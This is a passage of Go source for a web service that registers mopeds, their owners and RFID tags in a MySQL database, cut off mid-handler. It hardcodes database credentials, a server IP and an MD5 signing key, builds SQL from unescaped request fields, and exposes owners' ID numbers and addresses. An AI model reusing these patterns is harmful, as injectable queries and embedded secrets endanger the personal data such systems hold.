package main

import (
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"os/exec"
	"strconv"
	"strings"
	"time"
	//"crypto/aes"
	//"crypto/cipher"
	"flag"

	"github.com/ziutek/mymysql/mysql"
	_ "github.com/ziutek/mymysql/native" // Native engine
	//"html"
	//"log"
	//"net/url"
	//_ "github.com/ziutek/mymysql/thrsafe" // Thread safe engine

	//"encoding/base64"
	//"encoding/json"
	"fmt"
	"net/http"

	"github.com/golang/glog"
)

var md5key = "ga3trimps"

func opendb() mysql.Conn {

	//db := mysql.New("tcp", "", "127.0.0.1:3306", "root", "trimps3393", "mopedmanage")
	//db := mysql.New("tcp", "", "127.0.0.1:3306", "moped", "moped", "mopedmanage")
	db := mysql.New("tcp", "", "202.127.26.252:3306", "moped", "moped", "mopedmanage")

	err := db.Connect()
	if err != nil {
		glog.Errorln("数据库无法连接")
		return nil
	}
	db.Query("set names utf8")
	return db

}
func GetMd5String(s string) string {
	h := md5.New()
	h.Write([]byte(s))
	ret := hex.EncodeToString(h.Sum(nil))
	glog.V(4).Infoln(ret)
	return ret
}

func cmp_md5(str string, sig string) bool {
	if GetMd5String(str) == sig {
		return true
	}

	return false

}

func main() {
	flag.Parse()
    
	http.HandleFunc("/mopedtagissue", mopedtagissue)
	http.HandleFunc("/area", area_func)
	http.HandleFunc("/type", type_func)
	http.HandleFunc("/color", color_func)
	http.HandleFunc("/get_moped", get_moped)
	http.HandleFunc("/Upt_tagstate", Upt_tagstate)
	http.HandleFunc("/getMopedBynameOrHphm", getMopedBynameOrHphm)
	http.HandleFunc("/getMopedBynameOrHphm2", getMopedBynameOrHphm2)
	http.HandleFunc("/updateState", updateState)
	http.HandleFunc("/getTagid", getTagid)
	http.HandleFunc("/getTagid2", getTagid2)
	http.HandleFunc("/repeatISssue", repeatISssue)

	http.HandleFunc("/jcomein", jcomein)

	http.HandleFunc("/maxTagidphyno", maxTagidphyno)
	http.HandleFunc("/addMopedtype", addMopedtype)
	http.HandleFunc("/isExistmopedtype", isExistmopedtype)
	http.Handle("/src/", http.StripPrefix("/src/", http.FileServer(http.Dir("./htmlsrc/"))))

	glog.Info("程序启动，开始监听58080端口")
	defer func() {
		glog.Infoln("成功退出")
		glog.Flush()
	}()

	for {
		err := http.ListenAndServe(":58080", nil)
		if err != nil {
			//log.Fatal("ListenAndServer: ", err)
			fmt.Println("ListenAndServer: ", err)

		}
	}

}

type STATUSRET struct {
	Status string `json:"status"`
}

func mopedtagissue(w http.ResponseWriter, r *http.Request) { /*http://202.127.26.252/XXX/mopedtagissue*/
	r.ParseForm()
	tagid := r.FormValue("tagid")
	areaid := r.FormValue("areaid")
	hphm := r.FormValue("hphm")
	typeid := r.FormValue("typeid")
	pic := r.FormValue("pic")
	vin := r.FormValue("vin")
	colorid := r.FormValue("colorid")
	name := r.FormValue("name")
	phone := r.FormValue("phone")
	address := r.FormValue("address")
	photo := r.FormValue("photo")
	SID := r.FormValue("SID")
	haskey := r.FormValue("haskey")
	sign := r.FormValue("sign")
	districtid := r.FormValue("districtid")
	mopedtypeid2 := r.FormValue("mopedtypeid2")

	var statusret STATUSRET

	if len(r.Form["tagid"]) <= 0 ||
		len(r.Form["areaid"]) <= 0 ||
		len(r.Form["hphm"]) <= 0 ||
		len(r.Form["typeid"]) <= 0 ||
		len(r.Form["pic"]) <= 0 ||
		len(r.Form["vin"]) <= 0 ||
		len(r.Form["colorid"]) <= 0 ||
		len(r.Form["name"]) <= 0 ||
		len(r.Form["phone"]) <= 0 ||
		len(r.Form["address"]) <= 0 ||
		len(r.Form["photo"]) <= 0 ||
		len(r.Form["SID"]) <= 0 ||
		len(r.Form["haskey"]) <= 0 ||
		len(r.Form["sign"]) <= 0 {
		statusret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'}"))
		return

	}

	if len(tagid) <= 0 || len(areaid) <= 0 || len(hphm) <= 0 || len(name) <= 0 || len(sign) <= 0 {
		statusret.Status = "1003"
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'}"))
		return
	}
	if len(tagid) != 8 {
		statusret.Status = "1003"
		glog.V(3).Infoln("tagid格式不对")
		w.Write([]byte("{status:'1003'}"))
		return
	}

	str := fmt.Sprintf("tagid=%s&areaid=%s&hphm=%s&name=%s&key=%s", tagid, areaid, hphm, name, md5key)
	if cmp_md5(str, sign) != true {
		statusret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002'}"))
		return
	}

	db := opendb()
	if db == nil {
		statusret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}
	var sql string
	sql = `SELECT * from tag_tb where tag_tagid = "%s" and (tag_state = 1 or tag_state=2 or tag_state=3)  `
	sql = fmt.Sprintf(sql, tagid)
	res, err := db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("select from tag_tb处理失败")
		w.Write([]byte("{status:'1000'}"))
		return
	}
	row, err := res.GetRow()
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("tag_tb getrow()处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	}

	if row != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("此卡数据库中已经存在")
		w.Write([]byte("{status:'1000' }"))
		return
	}

	sql = `SELECT * from moped_tb where moped_hphm= "%s" and (moped_state=1 or moped_state=2)`
	sql = fmt.Sprintf(sql, hphm)
	res, err = db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("select from moped_tb处理失败")
		w.Write([]byte("{status:'1000'}"))
		return
	}
	row, err = res.GetRow()
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("moped_tb getrow()处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	}
	if row != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("此号牌数据库中已经存在")
		w.Write([]byte("{status:'1000' }"))
		return
	}

	_, err = db.Start("begin")

	sql = `insert into tag_tb(tag_tagid, tag_state ,tag_phyno,tag_datetime,tag_haskey,district_id) values("%s",2 ,"%d" ,"%s" , %s, %s) `
	i_tagid, err := strconv.ParseInt(tagid[2:], 16, 32)
	if err != nil {
		glog.V(3).Infoln("ParseInt(tagid)处理失败")
		w.Write([]byte("{status:'1000'}"))
		return
	}
	sql = fmt.Sprintf(sql, tagid, i_tagid, time.Now().Format("2006-01-02 15:04:05"), haskey, districtid)
	_, err = db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("into tag_tb处理失败")
		w.Write([]byte("{status:'1000'}"))
		return
	} else {

		statusret.Status = "1" //处理成功
	}
	sql = `insert into moped_tb(moped_hphm,moped_type,moped_pic,moped_vin,moped_colorid,area_id,moped_state,district_id,moped_mopedtype) 
	     values("%s",%s,"%s","%s",%s,%s,%s,%s,%s) `
	sql = fmt.Sprintf(sql, hphm, typeid, pic, vin, colorid, areaid, "2", districtid, mopedtypeid2)
	_, err = db.Start(sql)
	//glog.V(4).Infoln(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("into moped_tb处理失败")
		w.Write([]byte("{status:'1000'}"))
		_, err = db.Start("rollback")
		if err != nil {
			glog.V(3).Infoln("into  tag_tb rollback处理失败")
		}
		return
	} else {

		statusret.Status = "1" //处理成功
	}

	sql = `insert into owner_tb(owner_name,owner_phone,owner_address,owner_photo,owner_SID,area_id,owner_state) 
	     values("%s","%s","%s","%s","%s",%s,%s) `
	sql = fmt.Sprintf(sql, name, phone, address, photo, SID, areaid, "1")
	_, err = db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("into owner_tb处理失败")
		w.Write([]byte("{status:'1000'}"))
		_, err = db.Start("rollback")
		if err != nil {
			glog.V(3).Infoln("into  moped_tb rollback处理失败")
		}
		return
	} else {

		statusret.Status = "1" //处理成功
	}

	sql = `insert into mopedtag_tb(moped_id,tag_id,mopedtag_datetime,mopedtag_state) 
	     select moped_tb.moped_id,tag_tb.tag_id,"%s",1 from moped_tb join tag_tb where moped_tb.moped_hphm = "%s" and tag_tb.tag_tagid = "%s" `
	sql = fmt.Sprintf(sql, time.Now().Format("2006-01-02 15:04:05"), hphm, tagid)
	_, err = db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("into mopedtag_tb处理失败")
		w.Write([]byte("{status:'1000'}"))
		_, err = db.Start("rollback")
		if err != nil {
			glog.V(3).Infoln("into  owner_tb rollback处理失败")
		}
		return
	} else {

		statusret.Status = "1" //处理成功
	}

	sql = `insert into mopedowner_tb(moped_id,owner_id,mopedowner_datetime,mopedowner_state) 
	     select moped_tb.moped_id,owner_tb.owner_id,"%s",1 from moped_tb join owner_tb where moped_tb.moped_hphm = "%s" and owner_tb.owner_name = "%s" `
	sql = fmt.Sprintf(sql, time.Now().Format("2006-01-02 15:04:05"), hphm, name)
	_, err = db.Start(sql)
	if err != nil {
		statusret.Status = "1000"
		glog.V(3).Infoln("into mopedowner_tb处理失败")
		w.Write([]byte("{status:'1000'}"))
		_, err = db.Start("rollback")
		if err != nil {
			glog.V(3).Infoln("into  mopedtag_tb rollback处理失败")
		}
		return
	} else {

		statusret.Status = "1" //处理成功
	}

	_, err = db.Start("commit")
	if err != nil {
		glog.V(3).Infoln("commit处理失败")
		w.Write([]byte("{status:'1000'}"))
		return
	}

	b, err := json.Marshal(statusret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000}"))
		return

	}

	glog.V(3).Infoln("接口用于发卡软件与数据库之间的数据交互：成功")
	w.Write(b)

}

type AREADATA struct {
	Area_id   string `json:"area_id"`
	Area_name string `json:"area_name"`
}
type AREARET struct {
	Status string     `json:"status"`
	Data   []AREADATA `json:"data"`
}

func area_func(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/area   */
	r.ParseForm()
	areaid := r.FormValue("areaid")
	sign := r.FormValue("sign")
	var arearet AREARET

	if len(r.Form["areaid"]) <= 0 || len(r.Form["sign"]) <= 0 {
		arearet.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003',data:[]}"))
		return
	}
	if len(areaid) <= 0 || len(sign) <= 0 {
		arearet.Status = "1003"
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003',data:[]}"))
		return
	}

	str := fmt.Sprintf("areaid=%s&key=%s", areaid, md5key)
	if cmp_md5(str, sign) != true {
		arearet.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002',data:[] }"))
		return
	}

	db := opendb()
	if db == nil {
		arearet.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1',data:[] }"))
		return
	} else {
		defer db.Close()
	}
	var sql string
	if areaid == "-1" {
		sql = "select area_id ,area_name from area_tb  where (area_state = 1) order by area_id"
	} else {
		sql = "select area_id ,area_name from area_tb where area_id = " + areaid + " and (area_state = 1) order by area_id"
	}
	res, err := db.Start(sql)
	var areadata AREADATA
	var areadatas []AREADATA
	if err != nil {
		arearet.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000',data:[] }"))
		return
	} else {

		arearet.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				arearet.Status = "1000"
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000',data:[] '}"))
				return
			}

			if row == nil {
				// No more rows
				break
			}
			areadata.Area_id = row.Str(res.Map("area_id"))
			areadata.Area_name = row.Str(res.Map("area_name"))
			//fmt.Println(areadata.Area_name)
			areadatas = append(areadatas, areadata)
		}

	}
	arearet.Data = areadatas
	b, err := json.Marshal(arearet)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000},data:[] }"))
		return

	}

	glog.V(3).Infoln("获取区域列表：成功")
	w.Write(b)

}

type TYPEARRAY struct {
	Type_id   string `json:"type_id"`
	Type_name string `json:"type_name"`
}
type TYPERET struct {
	Status string      `json:"status"`
	Data   []TYPEARRAY `json:"data"`
}

func type_func(w http.ResponseWriter, r *http.Request) { /*  http://202.127.26.252/XXX/type   */
	r.ParseForm()
	typeid := r.FormValue("typeid")
	sign := r.FormValue("sign")
	var typeret TYPERET

	if len(r.Form["typeid"]) <= 0 || len(r.Form["sign"]) <= 0 {
		typeret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003',data:[]}"))
		return
	}
	if len(typeid) <= 0 || len(sign) <= 0 {
		typeret.Status = "1003"
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003',data:[] }"))
		return
	}

	str := fmt.Sprintf("typeid=%s&key=%s", typeid, md5key)
	if cmp_md5(str, sign) != true {
		typeret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002',data:[] }"))
		return
	}

	db := opendb()
	if db == nil {
		typeret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1',data:[] }"))
		return
	} else {
		defer db.Close()
	}
	var sql string
	if typeid == "-1" {
		sql = "select dicword_wordid , dicword_wordname FROM dicword_tb where dicword_dictypeid = 6"
	} else {
		sql = "select dicword_wordid , dicword_wordname FROM dicword_tb where dicword_dictypeid = 6 and dicword_wordid = " + typeid
	}
	sql = "SELECT    dicword_wordid,dicword_wordname FROM dicword_tb  WHERE     (dicword_state = 1) and dicword_dictypeid = " + typeid + " order by dicword_wordid"

	res, err := db.Start(sql)
	var typedata TYPEARRAY
	var typedatas []TYPEARRAY
	if err != nil {
		typeret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000',data:[] }"))
		return
	} else {

		typeret.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				typeret.Status = "1000"
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000',data:[] }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}
			typedata.Type_id = row.Str(res.Map("dicword_wordid"))
			typedata.Type_name = row.Str(res.Map("dicword_wordname"))

			typedatas = append(typedatas, typedata)
		}

	}
	typeret.Data = typedatas
	b, err := json.Marshal(typeret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000},data:[] }"))
		return

	}

	glog.V(3).Infoln("获取车辆品牌列表：成功")
	w.Write(b)
}

type COLORARRAY struct {
	Color_id   string `json:"color_id"`
	Color_name string `json:"color_name"`
}
type COLORRET struct {
	Status string       `json:"status"`
	Data   []COLORARRAY `json:"data"`
}

func color_func(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/color   */
	r.ParseForm()
	colorid := r.FormValue("colorid")
	sign := r.FormValue("sign")
	var colorret COLORRET
	if len(r.Form["colorid"]) <= 0 || len(r.Form["sign"]) <= 0 {
		colorret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003',data:[]}"))
		return
	}
	if len(colorid) <= 0 || len(sign) <= 0 {
		colorret.Status = "1003"
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003',data:[] }"))
		return
	}

	str := fmt.Sprintf("colorid=%s&key=%s", colorid, md5key)
	if cmp_md5(str, sign) != true {
		colorret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002',data:[] }"))
		return
	}

	db := opendb()
	if db == nil {
		colorret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1',data:[] }"))
		return
	} else {
		defer db.Close()
	}
	var sql string
	if colorid == "-1" {
		sql = "select dicword_wordid , dicword_wordname FROM dicword_tb where dicword_dictypeid = 7"
	} else {
		sql = "select dicword_wordid , dicword_wordname FROM dicword_tb where dicword_dictypeid = 7 and dicword_wordid = " + colorid
	}
	res, err := db.Start(sql)
	var colordata COLORARRAY
	var colordatas []COLORARRAY
	if err != nil {
		colorret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000',data:[] }"))
		return
	} else {

		colorret.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				colorret.Status = "1000"
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000',data:[] }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}
			colordata.Color_id = row.Str(res.Map("dicword_wordid"))
			colordata.Color_name = row.Str(res.Map("dicword_wordname"))

			colordatas = append(colordatas, colordata)
		}

	}
	colorret.Data = colordatas
	b, err := json.Marshal(colorret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000},data:[] }"))
		return

	}

	glog.V(3).Infoln("获取车身颜色列表：成功")
	w.Write(b)
}

type MOPEDARRAY struct {
	Areaid   string `json:"areaid"`   // 区域ID
	Areaname string `json:"areaname"` //区域名称
	Hphm     string `json:"hphm"`     //车牌号码
	Typetype string `json:"type"`     // 车辆品牌
	Color    string `json:"color"`    // 车辆颜色
	Name     string `json:"name"`     // 车主姓名
	Phone    string `json:"phone"`    // 电话
	SID      string `json:"SID"`      // 身份证号码
	Address  string `json:"Address"`  // 车主住址
	Tagid    string `json:"Tagid"`    // 车辆标签id
	Tagstate string `json:"Tagstate"` // 车辆标签状态

}
type MOPEDRET struct {
	Status string       `json:"status"`
	Data   []MOPEDARRAY `json:"data"`
}

func get_moped(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/get_moped   */
	r.ParseForm()
	areaid := r.FormValue("areaid")
	hphm := r.FormValue("hphm")
	typeid := r.FormValue("typeid")
	colorid := r.FormValue("colorid")
	name := r.FormValue("name")
	sign := r.FormValue("sign")

	var mopedret MOPEDRET

	if len(r.Form["areaid"]) <= 0 ||
		len(r.Form["hphm"]) <= 0 ||
		len(r.Form["typeid"]) <= 0 ||
		len(r.Form["colorid"]) <= 0 ||
		len(r.Form["name"]) <= 0 ||
		len(r.Form["sign"]) <= 0 {
		mopedret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003',data:[] }"))
		return
	}

	if len(areaid) <= 0 || len(sign) <= 0 || len(typeid) <= 0 || len(colorid) <= 0 {
		mopedret.Status = "1003"
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003',data:[] }"))
		return
	}

	str := fmt.Sprintf("areaid=%s&hphm=%s&typeid=%s&colorid=%s&name=%s&key=%s", areaid, hphm, typeid, colorid, name, md5key)
	if cmp_md5(str, sign) != true {
		mopedret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002',data:[] }"))
		return
	}

	db := opendb()
	if db == nil {
		mopedret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1',data:[] }"))
		return
	} else {
		defer db.Close()
	}
	sql := `SELECT  DISTINCT area_tb.area_id, area_tb.area_name ,moped_tb.moped_hphm , 
			type1_tb.dicword_wordname as typetype,color1_tb.dicword_wordname  ,owner_tb.owner_name ,
			owner_tb.owner_phone,owner_tb.owner_SID, owner_tb.owner_address,tag_tb.tag_tagid,tag_tb.tag_state 
			FROM owner_tb  JOIN moped_tb JOIN tag_tb   JOIN mopedowner_tb  
			ON moped_tb.moped_id = moped_tb.moped_id AND  mopedowner_tb.owner_id = owner_tb.owner_id  
			JOIN mopedtag_tb ON mopedtag_tb.moped_id = moped_tb.moped_id AND mopedtag_tb.tag_id = tag_tb.tag_id  
			JOIN area_tb ON area_tb.area_id = moped_tb.area_id   
			JOIN  dicword_tb  AS type1_tb  ON  type1_tb.dicword_dictypeid = 6 AND moped_tb.moped_type = type1_tb.dicword_wordid 
			JOIN   dicword_tb  AS color1_tb  ON   color1_tb.dicword_dictypeid = 7
			 AND moped_tb.moped_colorid = color1_tb.dicword_wordid  
			WHERE  `

	if areaid != "-1" {
		sql = sql + " area_tb.area_id = " + areaid + " AND "
	}
	if hphm != "" {
		sql = sql + " moped_tb.moped_hphm = \"" + hphm + "\" AND "
	}
	if typeid != "-1" {
		sql = sql + " type1_tb.dicword_wordid = " + typeid + "  AND "
	}
	if colorid != "-1" {
		sql = sql + "  color1_tb.dicword_wordid = " + colorid + "  AND "
	}

	if name != "" {
		sql = sql + " owner_tb.owner_name = \"" + name + "\" AND "
	}

	sql = sql + " 1=1 "

	res, err := db.Start(sql)
	var mopeddata MOPEDARRAY
	var mopeddatas []MOPEDARRAY
	if err != nil {
		mopedret.Status = "1000"
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000',data:[] }"))
		return
	} else {

		mopedret.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				mopedret.Status = "1000"
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000',data:[] }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}
			mopeddata.Areaid = row.Str(res.Map("area_id"))
			mopeddata.Areaname = row.Str(res.Map("area_name"))
			mopeddata.Hphm = row.Str(res.Map("moped_hphm"))
			mopeddata.Typetype = row.Str(res.Map("typetype"))
			mopeddata.Color = row.Str(res.Map("dicword_wordname"))
			mopeddata.Name = row.Str(res.Map("owner_name"))
			mopeddata.Phone = row.Str(res.Map("owner_phone"))
			mopeddata.SID = row.Str(res.Map("owner_SID"))
			mopeddata.Address = row.Str(res.Map("owner_address"))
			mopeddata.Tagid = row.Str(res.Map("tag_tagid"))
			mopeddata.Tagstate = row.Str(res.Map("tag_state"))

			mopeddatas = append(mopeddatas, mopeddata)
		}
	}
	mopedret.Data = mopeddatas
	b, err := json.Marshal(mopedret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000},data:[] }"))
		return

	}

	glog.V(3).Infoln("获取车辆发卡信息列表：成功")
	w.Write(b)

}

type TAGSTATERET struct {
	Status string `json:"status"`
}

func Upt_tagstate(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/Upt_tagstate   */
	r.ParseForm()
	hphm := r.FormValue("hphm")
	tagid := r.FormValue("tagid")
	state := r.FormValue("state")
	sign := r.FormValue("sign")

	var tagstateret TAGSTATERET
	if len(r.Form["hphm"]) <= 0 ||
		len(r.Form["tagid"]) <= 0 ||
		len(r.Form["state"]) <= 0 ||
		len(r.Form["sign"]) <= 0 {
		tagstateret.Status = "1003"
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if len(hphm) <= 0 || len(tagid) <= 0 || len(state) <= 0 || len(sign) <= 0 {
		tagstateret.Status = "1003"
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}

	str := fmt.Sprintf("hphm=%s&tagid=%s&state=%s&key=%s", hphm, tagid, state, md5key)
	if cmp_md5(str, sign) != true {
		tagstateret.Status = "1002"
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002'  }"))
		return
	}

	db := opendb()
	if db == nil {
		tagstateret.Status = "-1"
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'  }"))
		return
	} else {
		defer db.Close()
	}
	db.Start("begin")
	sql := `UPDATE   mopedtag_tb  SET  mopedtag_tb.moped_id = 
(SELECT moped_tb.moped_id FROM moped_tb WHERE moped_tb.moped_hphm = "%s" ), 
mopedtag_tb.tag_id = (SELECT tag_tb.tag_id FROM tag_tb  WHERE tag_tb.tag_tagid = "%s" ),
mopedtag_tb.mopedtag_datetime = "%s" 
WHERE  mopedtag_tb.moped_id = (SELECT moped_tb.moped_id FROM moped_tb WHERE moped_tb.moped_hphm = "%s" )`
	sql = fmt.Sprintf(sql, hphm, tagid, time.Now().Format("2006-01-02 15:04:05"), hphm)
	fmt.Println(sql)
	_, err := db.Start(sql)
	if err != nil {
		tagstateret.Status = "1000"
		glog.V(3).Infoln("UPDATE   mopedtag_tb处理失败")
		w.Write([]byte("{status:'1000'  }"))
		return
	} else {

		tagstateret.Status = "1" //处理成功
	}
	sql = `UPDATE tag_tb SET tag_state = %s WHERE tag_tagid = "%s" `
	sql = fmt.Sprintf(sql, state, tagid)
	_, err = db.Start(sql)
	if err != nil {
		tagstateret.Status = "1000"
		glog.V(3).Infoln("UPDATE tag_tb处理失败")
		w.Write([]byte("{status:'1000'  }"))
		db.Start("rollback")
		return
	} else {

		tagstateret.Status = "1" //处理成功
		db.Start("commit")
	}
	b, err := json.Marshal(tagstateret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000}  }"))
		return

	}

	glog.V(3).Infoln("Upt_tagstate：成功")
	w.Write(b)
}

type MOPEDBYNAMEARRAY struct {
	Areaname    string `json:"areaname"`         //区域名称
	Hphm        string `json:"hphm"`             //车牌号码
	Typetype    string `json:"type"`             //=> 车辆品牌
	Color       string `json:"color"`            // => 车辆颜色
	Name        string `json:"name"`             //=> 车主姓名
	Moped_id    string `json:"moped_id"`         // 表编号
	Tag_tagid   string `json:"tag_tagid"`        // 标签ID
	Moped_state string `json:"moped_state"`      //moped状态
	Str_state   string `json:"dicword_wordname"` //state str
}

type MOPEDBYNAMERET struct {
	Status string             `json:"status"`
	Data   []MOPEDBYNAMEARRAY `json:"data"`
}

func getMopedBynameOrHphm(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/getMopedBynameOrHphm   */
	r.ParseForm()
	hphm := r.FormValue("hphm")
	ownername := r.FormValue("ownername")
	sign := r.FormValue("sign")

	if len(r.Form["hphm"]) <= 0 || len(r.Form["ownername"]) <= 0 || len(r.Form["sign"]) <= 0 {
		glog.V(3).Infoln("请求参数缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	if /* (len(hphm) <= 0 && len(ownername) <= 0) || */ len(sign) <= 0 {
		glog.V(3).Infoln("请求参数内容缺失")
		w.Write([]byte("{status:'1003'  }"))
		return
	}
	str := fmt.Sprintf("hphm=%s&ownername=%s&key=%s", hphm, ownername, md5key)
	if cmp_md5(str, sign) != true {
		glog.V(3).Infoln("sign验证失败")
		w.Write([]byte("{status:'1002' }"))
		return
	}

	db := opendb()
	if db == nil {
		glog.V(3).Infoln("系统繁忙，稍后再试")
		w.Write([]byte("{status:'-1'}"))
		return
	} else {
		defer db.Close()
	}

	sql := `select DISTINCT area_tb.area_name , moped_tb.moped_hphm ,type1_tb.dicword_wordname as typetype ,  color1_tb.dicword_wordname , 
	  owner_tb.owner_name , moped_tb.moped_id , tag_tb.tag_tagid ,moped_tb.moped_state , type2_tb.dicword_wordname as statestr
	  FROM owner_tb  JOIN moped_tb JOIN tag_tb   JOIN mopedowner_tb  
			ON moped_tb.moped_id = mopedowner_tb.moped_id AND  mopedowner_tb.owner_id = owner_tb.owner_id  
			JOIN mopedtag_tb ON mopedtag_tb.moped_id = moped_tb.moped_id AND mopedtag_tb.tag_id = tag_tb.tag_id  
			JOIN area_tb ON area_tb.area_id = moped_tb.area_id  
			JOIN  dicword_tb  AS type2_tb  ON  type2_tb.dicword_dictypeid = 8 AND tag_tb.tag_state = type2_tb.dicword_wordid  
			JOIN  dicword_tb  AS type1_tb  ON  type1_tb.dicword_dictypeid = 6 AND moped_tb.moped_type = type1_tb.dicword_wordid 
			JOIN   dicword_tb  AS color1_tb  ON   color1_tb.dicword_dictypeid = 7
			 AND moped_tb.moped_colorid = color1_tb.dicword_wordid  
			WHERE mopedtag_tb.mopedtag_state = 1 and moped_tb.moped_hphm like "%%%s%%" and owner_tb.owner_name like "%%%s%%" and (owner_tb.owner_state = 1) order by owner_tb.owner_id `
	sql = "CALL getMopedBynameOrHphm('%s','%s')"
	//sql = fmt.Sprintf(sql, hphm, ownername)
	fmt.Println(sql)
	//glog.V(3).Infoln(sql)

	res, err := db.Start(sql)
	var mopedbynamedata MOPEDBYNAMEARRAY
	var mopedbynamedatas []MOPEDBYNAMEARRAY
	var mopedbynameret MOPEDBYNAMERET
	if err != nil {
		glog.V(3).Infoln("处理失败")
		w.Write([]byte("{status:'1000' }"))
		return
	} else {

		mopedbynameret.Status = "1" //处理成功

		for {
			row, err := res.GetRow()
			if err != nil {
				glog.V(3).Infoln("处理失败")
				w.Write([]byte("{status:'1000' }"))
				return
			}

			if row == nil {
				// No more rows
				break
			}

			mopedbynamedata.Areaname = row.Str(res.Map("area_name"))
			mopedbynamedata.Hphm = row.Str(res.Map("moped_hphm"))
			mopedbynamedata.Typetype = row.Str(res.Map("typetype"))
			mopedbynamedata.Color = row.Str(res.Map("dicword_wordname"))
			mopedbynamedata.Name = row.Str(res.Map("owner_name"))
			mopedbynamedata.Moped_id = row.Str(res.Map("moped_id"))
			mopedbynamedata.Tag_tagid = row.Str(res.Map("tag_tagid"))
			mopedbynamedata.Moped_state = row.Str(res.Map("moped_state"))
			mopedbynamedata.Str_state = row.Str(res.Map("statestr"))

			mopedbynamedatas = append(mopedbynamedatas, mopedbynamedata)
		}
	}
	mopedbynameret.Data = mopedbynamedatas
	b, err := json.Marshal(mopedbynameret)
	if err != nil {
		glog.V(3).Infoln("statusret 转json 出错")
		w.Write([]byte("{status:1000} }"))
		return

	}

	glog.V(3).Infoln("获取车辆信息以车牌和用户名列表：成功")
	w.Write(b)

}

type GETTAGIDARRAY struct {
	Tag_state string `json:"tag_state"` //  卡状态
	Tag_tagid string `json:"tag_tagid"` // 标签ID
}
type GETTAGIDRET struct {
	Status string          `json:"status"`
	Data   []GETTAGIDARRAY `json:"data"`
}

func getTagid(w http.ResponseWriter, r *http.Request) { /* http://202.127.26.252/XXX/getTagid   */
	r.ParseForm()
